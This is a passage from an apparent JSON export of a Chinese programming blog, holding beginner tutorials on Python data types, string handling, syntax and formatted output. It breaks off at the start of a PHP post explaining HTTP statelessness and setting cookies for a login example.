2==9\nPython整数的除法得到的结果是精确的。在Python中，有两种除法： 1. 一种除法是/(结果是浮点数) 2. 另一种是除法是//，称为地板除(两个整数的除法仍然是整数)   \n因为//除法只取结果的整数部分，所以Python还提供一个余数运算(%)，可以得到两个整数相除的余数。\n\n\n\n&emsp;示例代码：\na=10/3\nprint(a)\na=10//3\nprint(a)\na=10%3\nprint(a)\n\n运算结果：\n3.3333333333333335 \n3 \n1 \n\n\n三、Number 类型转换 \n\n\n\n\n\nint(x [,base ])\n将x转换为一个整数  \n\n\nlong(x [,base ])\n将x转换为一个长整数  \n\n\nfloat(x )\n将x转换到一个浮点数  \n\n\ncomplex(real [,imag ])\n创建一个复数  \n\n\nstr(x )\n将对象 x 转换为字符串  \n\n\nrepr(x )\n将对象 x 转换为表达式字符串  \n\n\neval(str )\n用来计算在字符串中的有效Python表达式,并返回一个对象  \n\n\ntuple(s )\n将序列 s 转换为一个元组  \n\n\nlist(s )\n将序列 s 转换为一个列表  \n\n\nchr(x )\n将一个整数转换为一个字符  \n\n\nunichr(x )\n将一个整数转换为Unicode字符  \n\n\nord(x )\n将一个字符转换为它的整数值  \n\n\nhex(x )\n将一个整数转换为一个十六进制字符串  \n\n\noct(x )\n将一个整数转换为一个八进制字符串  \n\n\n\n\n四、数学函数 \n\n\n\n\n\n函数\n返回值 ( 描述 )\n\n\n\n\nabs(x)\n返回数字的绝对值，如abs(-10) 返回 10\n\n\nceil(x)\n返回数字的上入整数，如math.ceil(4.1) 返回 5\n\n\ncmp(x, y)\n如果 x &lt; y 返回 -1, 如果 x == y 返回 0, 如果 x &gt; y 返回 1\n\n\nexp(x)\n返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045\n\n\nfabs(x)\n返回数字的绝对值，如math.fabs(-10) 返回10.0\n\n\nfloor(x)\n返回数字的下舍整数，如math.floor(4.9)返回 4\n\n\nlog(x)\n如math.log(math.e)返回1.0,math.log(100,10)返回2.0\n\n\nlog10(x)\n返回以10为基数的x的对数，如math.log10(100)返回 2.0\n\n\nmax(x1, x2,…)\n返回给定参数的最大值，参数可以为序列。\n\n\nmin(x1, x2,…)\n返回给定参数的最小值，参数可以为序列。\n\n\nmodf(x)\n返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示。\n\n\npow(x, y)\nx**y 运算后的值。\n\n\nround(x [,n])\n返回浮点数x的四舍五入值，如给出n值，则代表舍入到小数点后的位数。\n\n\nsqrt(x)\n返回数字x的平方根\n\n\n\n\n五、随机数函数 \n\n随机数可以用于数学，游戏，安全等领域中，还经常被嵌入到算法中，用以提高算法效率，并提高程序的安全性。\n\nPython包含以下常用随机数函数：\n\n\n\n函数\n描述\n\n\n\n\nchoice(seq)\n从序列的元素中随机挑选一个元素，比如random.choice(range(10))，从0到9中随机挑选一个整数。\n\n\nrandrange\n([start,] stop [,step])    从指定范围内，按指定基数递增的集合中获取一个随机数，基数缺省值为1\n\n\nrandom()\n随机生成下一个实数，它在[0,1)范围内。\n\n\nseed([x])\n改变随机数生成器的种子seed。如果你不了解其原理，你不必特别去设定seed，Python会帮你选择seed。\n\n\nshuffle(lst)\n将序列的所有元素随机排序\n\n\nuniform(x, y)\n随机生成下一个实数，它在[x,y]范围内。\n\n\n\n\n六、三角函数 \n\n\n\n\n函数\n描述\n\n\n\n\nacos(x)\n返回x的反余弦弧度值。\n\n\nasin(x)\n返回x的反正弦弧度值。\n\n\natan(x)\n返回x的反正切弧度值。\n\n\natan2(y, x)\n返回给定的 X 及 Y 坐标值的反正切值。\n\n\ncos(x)\n返回x的弧度的余弦值。\n\n\nhypot(x, y)\n返回欧几里德范数 sqrt(xx + yy)。\n\n\nsin(x)\n返回的x弧度的正弦值。\n\n\ntan(x)\n返回x弧度的正切值。\n\n\ndegrees(x)\n将弧度转换为角度,如degrees(math.pi/2) ， 返回90.0\n\n\nradians(x)\n将角度转换为弧度\n\n\n\n\n七、数学常量\n\n\n\n\n函数\n描述\n\n\n\n\npi\n数学常量 pi（圆周率，一般以π来表示）\n\n\ne\n数学常量 e，e即自然常数（自然常数）。 \n\n\n\n\n八、 range()函数\n\n\nPython3 range() 函数返回的是一个可迭代对象（类型是对象），而不是列表类型， 所以打印的时候不会打印列表。\n\n\nPython3 list() 函数是对象迭代器，可以把range()返回的可迭代对象转为一个列表，返回的变量类型为列表。\n\n\nPython2 range() 函数返回的是列表。\n\n\n[Python3 内置函数]&emsp;[Python3 range() 函数用法]\n\n\n\n\n函数语法：\nrange(stop)range(start, stop[, step])\n\n\n\n参数说明：\nstart: 计数从 start开始。默认是从 0 开始。例如range（5）等价于range（0， 5）;stop: 计数到 stop 结束，但不包括 stop。例如：range（0， 5） 是[0, 1, 2, 3, 4]没有5step：步长，默认为1。例如：range（0， 5） 等价于 range(0, 5, 1)\n\n\n\n3.2 浮点数\n浮点数也就是小数，之所以称为浮点数，是因为按照科学记数法表示时，一个浮点数的小数点位置是可变的，比如，1.23x10^9和12.3x10^8是完全相等的。浮点数可以用数学写法，如1.23，3.14，-9.01，等等。但是对于很大或很小的浮点数，就必须用科学计数法表示，把10用e替代，1.23x109就是1.23e9，或者12.3e8，0.000012可以写成1.2e-5，等等。\n\n整数和浮点数在计算机内部存储的方式是不同的，整数运算永远是精确的（除法难道也是精确的？是的！），而浮点数运算则可能会有四舍五入的误差。\n\n\n\n\n\n\n3.3 字符串1.定义字符串并输出\n区分单引号和双引号：字符串是以单引号&#39;或双引号&quot;括起来的任意文本，比如&#39;abc&#39;，&quot;xyz&quot;等等。请注意：&#39;&#39;或&quot;&quot;本身只是一种表示方式，不是字符串的一部分，因此，字符串&#39;abc&#39;只有a，b，c这3个字符。如果&#39;本身也是一个字符，那就可以用&quot;&quot;括起来，比如&quot;I&#39;m OK&quot;包含的字符是I，&#39;，m，空格，O，K这6个字符。即单引号要放到双引号里面，双引号要放到单引号里面。\n\n\n\n\n\n使用转义字符“\\” ： 如果字符串内部既包含&#39;又包含&quot;怎么办？可以用转义字符\\来标识，比如：\n\n\n\na='I\\'m \\\"OK\\\"!'\nprint(a)\n\n运行输出：\nI'm \"OK\"! \n\n\n把双引号括在单引号里面，但是下面的单引号必须转义，如下也是正确的：\n\na='I\\'m \"OK\"!'\nprint(a)\n\n\n\n使用不转义字符“r&#39;&#39;”： 如果字符串里面有很多字符都需要转义，就需要加很多\\，为了简化，Python还允许用r&#39;&#39;表示，&#39;&#39;内部的字符串默认不转义，可以自己试试：\n\n\n\n\na='\\\\\\t\\\\'\nprint(a)\n\na=r'\\\\\\t\\\\'\nprint(a)\n\n输出结果：\n\\    \\ \n\\\\\\t\\\\ \n\n\n\n在字符串里面有换行，将字符串按照换行输出。使用&#39;&#39;&#39;  内容  &#39;&#39;&#39;：如果字符串内部有很多换行，用\\n写在一行里不好阅读，为了简化，Python允许用&#39;&#39;&#39; 这里写内容&#39;&#39;&#39;的格式表示多行内容，可以自己试试：\n\n\n\n\na='''hello\nworld\nline1\nline2'''\nprint(a)\n\n运行输出：\nhello \nworld \nline1 \nline2 \n\n\n\n在字符串里面有换行，将字符串按照换行输出，并且不转义输出字符。使用r&#39;&#39;&#39;  &#39;&#39;&#39;：\n\n\n\n\na=r'''hello \\n\nworld\nline1\nline2'''\nprint(a)\n\n运行输出：\nhello \\n \nworld \nline1 \nline2 \n\n\n2.使用字符串(取下标)\npython的字串列表有2种取值顺序:1. 从左到右索引默认0开始的，最大范围是字符串长度少1；2. 从右到左索引默认-1开始的，最大范围是字符串开头。\n\n\n\n\n如果你要实现从字符串中获取一段子字符串的话，可以使用 [头下标:尾下标] 来截取相应的字符串，其中下标是从 0 开始算起，可以是正数或负数，下标可以为空表示取到头或尾。\n[头下标:尾下标] 获取的子字符串包含头下标的字符，但不包含尾下标的字符。\n\n\n\n\n比如:\ns = 'abcdef'\nprint(s[2])\nprint(s[1:5])\n\n运行结果：\nc \nbcde \n\n\n当使用以冒号:分隔的字符串，python 返回一个新的对象，结果包含了以这对偏移标识的连续的内容，左边的开始是包含了下边界。上面的结果包含了 s[1] 的值 b，而取到的最大范围不包括尾下标，就是 s[5] 的值 f。\n\n\n\n3.加号(+)星号(*)冒号(:)\n\n加号(+)：拼接字符串；\n星号(*)：重复操作；\n冒号(:)：截取字符。\n\n\n\n\nPython使用加号（ + ）来合并字符串\n\n\n\nfirst_name = \"ada\"\nlast_name = \"lovelace\"\nfull_name = first_name + \" \" + last_name\nprint(\"Hello, \" + full_name + \"!\")\n\n运行结果：\nHello, ada lovelace! \n\n\n\nPython使用星号（ * ）来重复字符串\n\n\n\nstr = 'Hello World!'\na=str*2\nprint(a)\n\n运行输出：\nHello World!Hello World! \n\n\n\nPython使用冒号（ ： ）来截取字符\n\n\n\n#!/usr/bin/python\n# -*- coding: UTF-8 -*-\n\nstr = 'Hello World!'\n\nprint str           # 输出完整字符串\nprint str[0]        # 输出字符串中的第一个字符\nprint str[2:5]      # 输出字符串中第三个至第五个之间的字符串\nprint str[2:]       # 输出从第三个字符开始的字符串\nprint str * 2       # 输出字符串两次\nprint str + \"TEST\"  # 输出连接的字符串\n\n以上实例输出结果：\nHello World!\nH\nllo\nllo World!\nHello World!Hello World!\nHello World!TEST\n\n\nPython 列表截取可以接收第三个参数，参数作用是截取的步长，以下实例在索引 1 到索引 4 的位置并设置为步长为 2（间隔一个位置）来截取字符串：\n\n\n\n4.常用的字符串方法1. 修改字符串的大小写\n使用方法：\n\nupper()：将字符串所有字母大写；\nlower()：将字符串所有字母小写；\ntitle()：将字符串所有单词首字母大写，并将单词中除了首字母的变为小写。\n\n\n\n示例代码：\nname = \"Hexo lovelace giTHub toMMrow n\"\nprint(name.upper())\nprint(name.lower())\nprint(name.title())\n\n运行输出：\nHEXO LOVELACE GITHUB TOMMROW N \nhexo lovelace github tommrow n \nHexo Lovelace Github Tommrow N \n\n在name.title() 中，name 后面的句点（ . ）让Python对变量name 执行方法title() 指定的操作。每个方法后面都跟着一对括号，这是因为方法通常需要额外的信息来完成其工作。这种信息是在括号内提供的。函数title() 不需要额外的信息，因此它后面的括号是空的。\n\n\n\n2. 暂时/永久删除字符串两端空白\n使用方法：1. strip()：删除字符串两端空白或换行符；2. lstrip()：删除字符串左端空白或换行符；3. rstrip()：删除字符串右端空白或换行符；\n\n\n\n暂时或者是永久删除的区别是在于调用方法后是否重新赋值给一个变量：1. 不赋值：暂时删除，下次调用时还是原字符串；2. 重新赋值：永久删除。\n\n\n示例代码：\nname = \"    HexoAndGithub  \"\n\nprint(name)\nprint(name.strip())\nprint(name.rstrip())\nprint(name.lstrip())\nprint(name)\n\nprint('\\n')\nname = name.strip()\nprint(name)\nprint(name.strip())\nprint(name.rstrip())\nprint(name.lstrip())\nprint(name)\n\n运行结果：\n    HexoAndGithub   \nHexoAndGithub \n    HexoAndGithub \nHexoAndGithub   \n    HexoAndGithub   \n\n\nHexoAndGithub \nHexoAndGithub \nHexoAndGithub \nHexoAndGithub \nHexoAndGithub \n\n\n3. 内置函数 len()返回字符串长度内置函数 len() 返回字符串长度，注意，它并不是字符串的方法！！！\n\na = 'supercalifragilisticexpialidocious'\nb = len(a)\nprint(a)\nprint(b)\n\n运行结果：\nsupercalifragilisticexpialidocious \n34 \n\n\n3.4 布尔值\n布尔值和布尔代数的表示完全一致，一个布尔值只有True、False两种值，要么是True，要么是False；\n\n在Python中，True、False首字母必须大写。可以直接用True、False表示布尔值，请注意大小写，也可以通过布尔运算计算出来：\n\n\n\n\na=True\nb=3>2\nprint(a,b)\n\n运行结果：\nTrue True \n\n\n\n布尔值可以用and、or和not运算\nand运算是与运算，只有所有都为True，and运算结果才是True \nor运算是或运算，只要其中有一个为True，or运算结果就是True \nnot运算是非运算，它是一个单目运算符，把True变成False，False变成True s\n\n\n\n\na= 5 > 3 and 3 &lt; 1\nb= 5 > 3 or 1 > 3\nc= not 1 > 2\nprint(a)\nprint(b)\nprint(c)\n\n运行结果：\nFalse \nTrue \nTrue \n\n","thumbnail":"https://i.loli.net/2019/02/27/5c76286c63008.jpg","plink":"https://Directoree.github.io/post/Python-Variables-DataTypes/"},{"title":"Python-基础语法","date":"2019-02-27T08:06:40.000Z","updated":"2019-03-06T10:25:51.455Z","content":"请务必注意，Python程序是大小写敏感的，如果写错了大小写，程序会报错。\n&ensp;&ensp;\nPython 基础语法 \n\n&emsp;&emsp;\n一. 标识符一、标识符定义规则\n\n\n在 Python 里，标识符由字母、数字、下划线组成。\n\n在 Python 中，所有标识符不能以数字开头。\n\nPython 中的标识符是区分大小写的。\n\n以下划线开头的标识符是有特殊意义的。\n\n以单下划线开头 _foo 的代表不能直接访问的类属性，需通过类提供的接口进行访问，不能用 from xxx import * 而导入。\n以双下划线开头的 __foo 代表类的私有成员，以双下划线开头和结尾的 __foo__代表 Python 里特殊方法专用的标识，如 __init__() 代表类的构造函数。\n\n\n\n\n二、Python 保留字符\n\n下面的列表显示了在Python中的保留字。这些保留字不能用作常数或变数，或任何其他标识符名称。\n\n\n\n\nand\nexec\nnot\n\n\nassert\nfinally\nor\n\n\nbreak\nfor\npass\n\n\nclass\nfrom\nprint\n\n\ncontinue\nglobal\nraise\n\n\ndef\nif\nreturn\n\n\ndel\nimport\ntry\n\n\nelif\nin\nwhile\n\n\nelse\nis\nwith\n\n\nexcept\nlambda\nyield\n\n\n\n\n二. 缩进(代码块)一、注意事项：\n\n\n学习 Python 与其他语言最大的区别就是，Python 的代码块不使用大括号 {} 来控制类，函数以及其他逻辑判断。python 最具特色的就是用缩进来写模块。\n\n缩进的空白数量是可变的，但是所有代码块语句必须包含相同的缩进空白数量，这个必须严格执行！！！\n\n按照约定俗成的管理，应该始终坚持使用4个空格的缩进；\n很多Python程序员都建议每行不超过80字符（最多79个见多）；\n要将程序的不同部分分开，可使用空行，但不要在程序文件中过多地使用空行\n\n\n\n\n以下代码将会执行错误：缩进空白数量不一样会报错！\n#!/usr/bin/python\n# -*- coding: UTF-8 -*-\n# 文件名：test.py\n\nif True:\n    print \"Answer\"\n    print \"True\"\nelse:\n    print \"Answer\"\n    # 没有严格缩进，在执行时会报错\n  print \"False\"\n\n执行以上代码，会出现如下错误提醒：\n$ python test.py  \n  File \"test.py\", line 10\n    print \"False\"\n                ^\nIndentationError: unindent does not match any outer indentation level\n\n\n二、多个语句构成代码块\n\n\nPython不像C/C++/Java一样一条语句是以;结束，而是换行即表示一个语句结束。\n\n缩进相同的一组语句构成一个代码块，我们称之代码组。\n\n像if、while、def和class这样的复合语句，首行以关键字开始，以冒号( : )结束，该行之后的一行或多行缩进代码构成代码组。注意这里冒号( : )不能省略。\n\n\n\n如下实例的冒号不能省略：\nif expression : \n   suite \nelif expression :  \n   suite  \nelse :  \n   suite \n\n\n三. 一行和多行语句\n一行分为：\n\n同一行显示多条语句;\n将一行的语句分为多行显示(一条语句以多行来书写)也包括在多行语句里面来讲。\n\n\n\n1. 同一行显示多条语句\n\nPython可以在同一行中使用多条语句，语句之间使用分号( ; )分割，以下是一个简单的实例：\n#!/usr/bin/python\n\nimport sys; x = 'runoob'; sys.stdout.write(x + '\\n')\n\n运行输出：\nrunoob\n\n\n3. 一条语句以多行来书写\n\n看下面的多行语句即可，是同一个意思。\n\n3. 多行语句\n\n\n多行：\n\nPython语句中一般以新行作为语句的结束符，但是我们可以使用斜杠（  \\ ）将一行的语句分为多行显示，斜杠（  \\ ）称为多行连接符。\n语句中包含 [], {} 或 () 括号就不需要使用多行连接符。\n\n\n\nPython语句中一般以新行作为语句的结束符。但是我们可以使用斜杠（  \\ ）将一行的语句分为多行显示，如下所示：\n\ntotal = item_one + \\\n        item_two + \\\n        item_three\n\n\n\n语句中包含 [], {} 或 () 括号就不需要使用多行连接符。如下实例：\n\ndays = ['Monday', 'Tuesday', 'Wednesday',\n        'Thursday', 'Friday']\n\n\n四. 引号\nPython 可以使用单引号( &#39; )、双引号( &quot; )、三引号( &#39;&#39;&#39; 或 &quot;&quot;&quot; ) 来表示字符串，引号的开始与结束必须的相同类型的。\n\n其中三引号可以由多行组成，编写多行文本的快捷语法，常用于文档字符串，在文件的特定地点，被当做注释。\n\n\n如下示例：\nword = 'word'\nsentence = \"这是一个句子。\"\nparagraph = \"\"\"这是一个段落。\n包含了多个语句\"\"\"\n\n\n五. 注释\npython中单行注释采用 # 开头。\npython 中多行注释使用三个单引号( &#39;&#39;&#39; )或三个双引号( &quot;&quot;&quot; )。\n\n单行注释,如下示例1：\n#!/usr/bin/python\n# -*- coding: UTF-8 -*-\n# 文件名：test.py\n\n# 第一个注释\nprint \"Hello, Python!\"  # 第二个注释\n\n多行注释,如下示例2：\n#!/usr/bin/python\n# -*- coding: UTF-8 -*-\n# 文件名：test.py\n\n\n'''\n这是多行注释，使用单引号。\n这是多行注释，使用单引号。\n这是多行注释，使用单引号。\n'''\n\n\"\"\"\n这是多行注释，使用双引号。\n这是多行注释，使用双引号。\n这是多行注释，使用双引号。\n\"\"\"\n\n\n六. 空行\n\n函数之间或类的方法之间用空行分隔，表示一段新的代码的开始。类和函数入口之间也用一行空行分隔，以突出函数入口的开始。\n空行与代码缩进不同，空行并不是Python语法的一部分。书写时不插入空行，Python解释器运行也不会出错。但是空行的作用在于分隔两段不同功能或含义的代码，便于日后代码的维护或重构。\n记住：空行也是程序代码的一部分。\n\n\n什么是空行？\na=2+3\nprint(a)\n           #这里就是空行\nb=a+3\nprint(b)\n\n\n七. 输出(print)Python3.0以后的输出使用print()函数。分为换行输出和不换行输出。在print()括号中加上字符串，就可以向屏幕上输出指定的文字。括号里还可以放表达式等……\n\n\n换行输出：print 默认输出是换行的\n不换行输出：将括号里的所有参数输出在一行，只需要在每一个参数后面加一个,即可。注意：\n最后一个参数后面没有,，也就是和普通函数使用一样；\n参数中间的,输出来是一个空格。如下：\n\n\n循环输出变量b的时候如果不换行，可在后面加个end=&#39; &#39;，即print(b, end=&#39; &#39;)\n\n\nprint('Thequickbrownfox', 'jumpsover', 'thelazydog')\n\n运行结果：\nThequickbrownfox jumpsover thelazydog \n\n\n\n7.1 输出的补充\nPython的三种输出：\n\nPython两种输出值的方式: 表达式语句和print()函数；\n如果你希望输出的形式更加多样，可以使用 str.format() 函数来格式化输出值。\n如果你希望将输出的值转成字符串，可以使用 repr() 或 str() 函数来实现.\n\n\n第三种方式是使用文件对象的write() 方法，标准输出文件可以用sys.stdout引用！\n\n\n\n7.2 输出时常用的函数\nstr()： 将对象转化为适于人阅读的形式，函数返回一个对象的string格式。\nrepr()： 将对象转化为供解释器读取的形式，返回一个对象的 string 格式。可以输出包括转义字符在内的所有字符！\nend=&#39; &#39;： 循坏输出时常用于不换行输出。\nstr.format() ：格式化输出。\n\n\n举例：\nx = \"'abcd\\ne\\nfg'\"\nprint(str(x))\nprint(repr(x))\n\noutput：\n'abcd\ne\nfg'\n\"'abcd\\ne\\nfg'\"\n------------------------------------------------------------------------------------------\n'''repr() 的参数可以是 Python 的任何对象'''\nx = 10 * 3.25\ny = 200 * 200\nprint(repr((x, y, ('Google', 'Runoob'))))\n\noutput： (32.5, 40000, ('Google', 'Runoob'))\n------------------------------------------------------------------------------------------\n'''  我们都知道正常情况下将多个字符串输出在一行直接使用半角逗号,分隔即可。但是循坏输出要想不换行就得\n使用 end=' '了  '''\n\na = [1,2,3,4,5,6]\nfor x in a:\n  print(x)\nprint('\\n----------分隔符-----------') \nfor y in a: \n  print(y,end='')\nprint('\\n----------分隔符-----------') \nfor y in a: \n  print(y,end='w')\nprint('\\n----------分隔符-----------') \nfor y in a: \n  print(y,end=' ')\nOUTPUT：\n1\n2\n3\n4\n5\n6\n\n----------分隔符-----------\n123456\n----------分隔符-----------\n1w2w3w4w5w6w\n----------分隔符-----------\n1 2 3 4 5 6\n\n\n7.3 str.format()格式化字符串旧式的格式化输出在[Python-基础语法]里面讲过，这里的str.format()就是新版的格式化的一种形式。\n语法：字符串类型格式化采用format()方法，基本使用格式是：\n&lt;模板字符串&gt;.format(&lt;逗号分隔的参数&gt;)\n\n所谓的str.format()：即.format()前是一个字符串，字符串里面有{}相当于旧书式的%。{}及其里面的字符 (称作格式化字段) 将会被 format() 中的参数替换。分为以下几种使用方法：\n\n\n在括号中的数字用于指向传入对象在 format() 中的索引位置，如下所示：\n\nprint('{0} 和 {1}'.format('Google', 'Runoob'))\nprint('{1} 和 {0}'.format('Google', 'Runoob'))\n\nOUTPUT：\nGoogle 和 Runoob\nRunoob 和 Google\n\n\n\n在 format() 中使用了关键字参数, 那么它们的值会指向使用该名字的参数。也可以位置及关键字参数可以任意的结合:\n\nprint('{0} 和 {1}'.format('Google', 'Runoob'))\nprint('{1} 和 {0}'.format('Google', 'Runoob'))\nprint('站点列表 {0}, {1}, 和 {other}。'.format('Google', 'Runoob',\n                                                       other='Taobao'))\n\nOUTPUT：\nGoogle 和 Runoob\nRunoob 和 Google\n站点列表 Google, Runoob, 和 Taobao。\n\n\n\n在 {} 里使用 !a (使用 ascii()), !s(使用 str()) 和 !r (使用 repr()) 可以用于在格式化某个值之前对其进行转化:\n\nimport math\nprint('常量 PI 的值近似为： {}。'.format(math.pi))\nprint('常量 PI 的值近似为： {!s}。'.format(math.pi))\n\nOUTPUT:\n常量 PI 的值近似为： 3.141592653589793。\n常量 PI 的值近似为： 3.141592653589793。\n\n\n\n可选项 : 和格式标识符可以跟着字段名。 这就允许对值进行更好的格式化。\n\nformat()方法中&lt;模板字符串&gt;的{}除了包括参数序号，还可以包括格式控制信息。此时，{}的内部样式如下：\n     {&lt;参数序号&gt;: &lt;格式控制标记&gt;}  \n\n其中，&lt;格式控制标记&gt;用来控制参数显示时的格式，包括：&lt;填充&gt;&lt;对齐&gt;&lt;宽度&gt;,&lt;.精度&gt;&lt;类型&gt; 6 个字段，这些字段都是可选的，可以组合使用，逐一介绍如下。参考：[Python字符串格式化–format()方法]\n\n\n&lt;宽度&gt;指当前槽的设定输出字符宽度，如果该槽对应的format()参数长度比&lt;宽度&gt;设定值大，则使用参数实际长度。如果该值的实际位数小于指定宽度，则位数将被默认以空格字符补充。\n&lt;对齐&gt;指参数在&lt;宽度&gt;内输出时的对齐方式，分别使用&lt;、&gt;和^三个符号表示左对齐、右对齐和居中对齐。\n&lt;填充&gt;指&lt;宽度&gt;内除了参数外的字符采用什么方式表示，默认采用空格，可以通过&lt;填充&gt;更换。\n\ns = \"PYTHON\"\n\n\"{0:30}\".format(s)\nOut[17]: 'PYTHON                        '\n\n\"{0:>30}\".format(s)\nOut[18]: '                        PYTHON'\n\n\"{0:*^30}\".format(s)\nOut[19]: '************PYTHON************'\n\n\"{0:-^30}\".format(s)\nOut[20]: '------------PYTHON------------'\n\n\"{0:3}\".format(s)\n\nOut[21]: 'PYTHON'\n\n\n逗号（，）&lt;格式控制标记&gt;中逗号（，）用于显示数字的千位分隔符，例如：\n\"{0:-^20,}\".format(1234567890)\nOut[24]: '---1,234,567,890----'\n\n\"{0:-^20}\".format(1234567890) #对比输出\nOut[25]: '-----1234567890-----'\n\n\"{0:-^20,}\".format(12345.67890)\nOut[26]: '----12,345.6789-----'\n\n\n&lt;.精度&gt;表示两个含义，由小数点（.）开头。对于浮点数，精度表示小数部分输出的有效位数。对于字符串，精度表示输出的最大长度。\n&lt;类型&gt;表示输出整数和浮点数类型的格式规则。对于整数类型，输出格式包括6 种：\n\nb: 输出整数的二进制方式；\nc: 输出整数对应的 Unicode 字符；\nd: 输出整数的十进制方式；\no: 输出整数的八进制方式；\nx: 输出整数的小写十六进制方式；\nX: 输出整数的大写十六进制方式；\n\n>>> table = {'Google': 1, 'Runoob': 2, 'Taobao': 3}\n>>> for name, number in table.items():\n...     print('{0:10} ==> {1:10d}'.format(name, number))\n...\nRunoob     ==>          2\nTaobao     ==>          3\nGoogle     ==>          1\n\n对于浮点数类型，输出格式包括4 种：\n\ne: 输出浮点数对应的小写字母 e 的指数形式；\nE: 输出浮点数对应的大写字母 E 的指数形式；\nf: 输出浮点数的标准浮点形式；\n%: 输出浮点数的百分形式。\n\n\n\n如果你有一个很长的格式化字符串, 而你不想将它们分开, 那么在格式化时通过变量名而非位置会是很好的事情。\n\n最简单的就是传入一个字典, 然后使用方括号 [] 来访问键值 :\n>>> table = {'Google': 1, 'Runoob': 2, 'Taobao': 3}\n>>> print('Runoob: {0[Runoob]:d}; Google: {0[Google]:d}; Taobao: {0[Taobao]:d}'.format(table))\nRunoob: 2; Google: 1; Taobao: 3\n\n\n也可以通过在 table 变量前使用 '**' 来实现相同的功能：\n\n>>> table = {'Google': 1, 'Runoob': 2, 'Taobao': 3}\n>>> print('Runoob: {Runoob:d}; Google: {Google:d}; Taobao: {Taobao:d}'.format(**table))\nRunoob: 2; Google: 1; Taobao: 3\n\n\n八. 输入(input)\n\n函数input()让程序暂停运行，等待用户输入一些文本。获取用户输入后，Python将其存储在一个变量（指针）中，以方便你使用。\ninput()函数有个返回值，返回类型为String。\n\n\n\n一、参数\n\n输入分为两种：空参数、带有参数。\n空参数：input()；效果是屏幕上没有任何提示，等待用户输入。带有参数：input(&#39;请输入一个字符串：&#39;)；效果是屏幕上显示“请输入一个字符串：”，然后等待用户输入。二、返回值\n\n关于input()的返回值，是字符串String类型如下会报错，假如输入1998，返回给s的值是字符串”1998”，如果直接和数字型进行比较会报错：\ns = input('birth: ')\nbirth = s\nif birth &lt; 2000:\n    print('00前')\nelse:\n    print('00后')\n\n\n解决方法是使用函数int(str)，功能是将字符串类型转换成数字型。\ns = input('birth: ')\nbirth = int(s)\nif birth &lt; 2000:\n    print('00前')\nelse:\n    print('00后')\n\n","thumbnail":"https://i.loli.net/2019/02/27/5c7627f220a38.jpg","plink":"https://Directoree.github.io/post/Python-Grammar/"},{"title":"Python-基础","date":"2019-02-27T02:18:37.000Z","updated":"2019-03-21T17:45:17.422Z","content":"从今天开始Python的学习吧……ヾ(๑╹◡╹)ﾉ”本文参考：\n[Python3 教程][廖雪峰的官方网站Python教程][Python编程：从入门到实践][Python 中文学习大本营-Python 3.6.X 官方教程]\n\n\n\n\n\n&ensp;&ensp;\nPython 基础 \n\n\n\n&emsp;&emsp;\n一. 基础语法参见本站博客：[Python-基础语法]\n\n\n\n\n二. 变量和数据类型参见本站博客：[Python-变量和数据类型]\n\n\n\n\n三. 运算符参见本站博客：[Python-运算符]\n\n\n\n\n\n四. 条件语句与循环参见本站博客：[Python-条件语句与循环]\n\n\n\n\n\n五. 字符编码、字符串、格式化参见本站博客：[Python-字符编码&amp;字符串&amp;格式化]\n\n\n\n\n\n六. 列表、元组、字典、集合参见本站博客：[Python-列表、元组、字典、集合]\n\n\n\n七. 函数参见本站博客：[Python-函数]\n\n\n\n\n八. 生成器与迭代器参见本站博客：[Python-生成器与迭代器]\n\n\n\n九. 模块和包参见本站博客：[Python-模块和包]\n\n\n\n\n\n十. 函数式编程参见本站博客：[Python-函数式编程]\n\n\n\n\n\n\n十一. 文件系统参见本站博客：[Python-文件系统]\n","thumbnail":"https://i.loli.net/2019/02/27/5c75f47d51065.jpg","plink":"https://Directoree.github.io/post/Python-Basics/"},{"title":"PHP-会话管理和控制","date":"2019-02-26T09:22:53.000Z","updated":"2019-03-02T09:53:38.327Z","content":"(。・∀・)ノ\n&ensp;&ensp;\nPHP 会话管理和控制\n\n&emsp;&emsp;\n一. 前言标准的http协议是无状态的，无连接的。？？？什么意思？⊙﹏⊙∥\n\n【无状态】\n\n协议对于事务处理没有记忆能力【事物处理】【记忆能力】\n对同一个url请求没有上下文关系【上下文关系】\n每次的请求都是独立的，它的执行情况和结果与前面的请求和之后的请求是无直接关系的，它不会受前面的请求应答情况直接影响，也不会直接影响后面的请求应答情况【无直接联系】【受直接影响】\n服务器中没有保存客户端的状态，客户端必须每次带上自己的状态去请求服务器【状态】\n\n\n\n【无连接】\n\n每一个访问都是无连接，服务器挨个处理访问队列里的访问，处理完一个就关闭连接，这事儿就完了，然后处理下一个新的\n无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接\n\n\n&emsp;具体内容以及为什么使用Session和Cookie参考下面博文：\n[http协议无状态中的 “状态” 到底指的是什么？！]\n\n\n\n&emsp;&emsp;\n二. Cookie概述什么是Cookie？请参考本站博客[HTTP协议请求头部的User-Agen和Cookie]\n&emsp;&emsp;\n三. PHP中的Cookie这节我们通过一个用户首次登陆网站后，再次访问不需要重复输入用户名和密码的例子来学习Cookie。\nphp中提供了一个函数来让我们设置cookie，这个函数是：bool setcookie();[PHP setcookie() 函数]需要注意的是，这个函数每次只能设置Cookie中的一个参数，比如一次只能设置用户名、密码等字段。\n\n\nbool setcookie  (\n        string $名字\n        [, string $值]\n        [, int $过期时间  = 0]\n        [, string $路径]\n        [, string $域名]\n        [, bool $安全  = false]\n        [, bool $http只读  = false]\n    );\n\n\n\n\n参数\n描述\n\n\n\n\n$名字\n必需。规定 cookie 的名称。\n\n\n$值\n可选。规定 cookie 的值。\n\n\n$有效期\n可选。规定 cookie 的有效期。\n\n\n$路径\n可选。规定 cookie 的服务器路径。\n\n\n$域名\n可选。规定 cookie 的域名。\n\n\n$安全\n可选。规定是否通过安全的 HTTPS 连接来传输 cookie。\n\n\n$http只读\n可选。如果true，那么js就无法读取改cookie，增加安全性。\n\n\n\n\n1.一般来说，我们其实用不到上面那么多参数，对于这个函数，我们一般这么用：setcookie(cookie名,cookie值,cookie有效期);2.没错，就那么3个。如此一来，我们就可以在服务端通过$_COOKIE[‘name’] 来读取cookie了。\n\n&emsp;&emsp;以下是示例：\n\n我们将文件名命名为：cookie.php。\n我们来模拟我们在互联网上见到最常见的例子：输入用户名和密码，登陆成功的过程。\n我们来建一个数据库login,其中有表user,有username和password这两个字段。\n\n&lt;?php\n//第一次登陆的时候，通过用户输入的信息来确认用户\nif ( ( $_POST['username'] != null ) &amp;&amp; ( $_POST['password'] 